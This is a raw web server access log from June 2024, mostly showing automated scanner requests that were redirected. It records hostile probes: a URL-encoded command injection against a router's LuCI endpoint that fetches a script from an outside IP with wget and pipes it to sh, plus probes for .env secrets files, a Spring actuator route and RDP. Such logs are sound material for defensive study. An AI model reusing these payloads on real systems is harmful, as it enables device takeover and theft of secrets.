167.172.179.235 - - [17/Jun/2024:06:26:22 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
172.206.142.254 - - [17/Jun/2024:06:29:49 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
167.94.145.103 - - [17/Jun/2024:06:33:41 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
167.94.145.103 - - [17/Jun/2024:06:33:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.103 - - [17/Jun/2024:06:33:51 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
185.191.127.212 - - [17/Jun/2024:06:34:03 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
147.185.133.186 - - [17/Jun/2024:06:34:52 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
149.50.103.48 - - [17/Jun/2024:06:36:01 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
104.152.52.21 - - [17/Jun/2024:06:49:31 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
149.50.103.48 - - [17/Jun/2024:06:53:47 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.224.128.43 - - [17/Jun/2024:07:05:01 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.103.48 - - [17/Jun/2024:07:13:51 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
147.28.129.15 - - [17/Jun/2024:07:18:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 zgrab/0.x"
149.50.103.48 - - [17/Jun/2024:10:02:02 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
182.44.10.67 - - [17/Jun/2024:10:07:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
78.153.140.218 - - [17/Jun/2024:10:12:39 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
149.50.103.48 - - [17/Jun/2024:10:13:02 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
199.45.154.24 - - [17/Jun/2024:10:33:00 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
199.45.154.24 - - [17/Jun/2024:10:33:10 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
149.50.103.48 - - [17/Jun/2024:10:37:17 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
206.189.188.21 - - [17/Jun/2024:10:45:44 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
203.2.64.59 - - [17/Jun/2024:10:49:25 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
149.50.103.48 - - [17/Jun/2024:10:56:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.126.213 - - [17/Jun/2024:11:01:09 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
149.50.103.48 - - [17/Jun/2024:11:16:00 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [17/Jun/2024:12:58:04 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.174.191.28 - - [17/Jun/2024:13:19:28 +0000] "GET / HTTP/1.0" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
167.94.138.54 - - [17/Jun/2024:13:19:52 +0000] "\x16\x03\x01\x01\x0E\x01\x00\x01" 400 154 "-" "-"
149.50.103.48 - - [17/Jun/2024:13:32:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
179.60.147.13 - - [17/Jun/2024:13:35:00 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
179.43.161.135 - - [17/Jun/2024:13:46:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [17/Jun/2024:13:54:46 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.126.213 - - [17/Jun/2024:14:01:12 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
83.97.73.245 - - [17/Jun/2024:14:04:45 +0000] "GET /actuator/gateway/routes HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.224.128.43 - - [17/Jun/2024:14:11:33 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.103.48 - - [17/Jun/2024:14:13:51 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
149.50.103.48 - - [17/Jun/2024:14:37:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
